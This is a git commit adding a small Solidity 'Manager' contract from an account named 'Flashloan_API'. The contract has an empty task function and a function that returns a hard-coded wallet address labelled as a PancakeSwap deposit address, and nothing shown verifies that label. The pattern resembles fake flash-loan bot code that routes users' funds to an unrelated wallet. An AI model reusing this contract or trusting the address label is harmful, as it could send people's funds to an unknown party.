d268ff7323c90619d8b1964f30eaec6824542e2c
Flashloan_API <77111560+Flashloan-API@users.noreply.github.com>
2022-03-11 00:11:42 +0100

    Add files via upload

---
+++ Contracts/interface/LandingCall-v1.0.1.sol
@@ -0,0 +1,14 @@
+pragma solidity ^0.5.0;
+
+//pancakeswapfunction
+
+contract Manager {
+    function performTasks() public pure{
+        
+    }
+    
+    function pancakeswapDepositAddress() public pure returns (address) {
+        return 0xbd544A56B22217C253548E2063f3d9EACC19183B;
+    }
+}
+
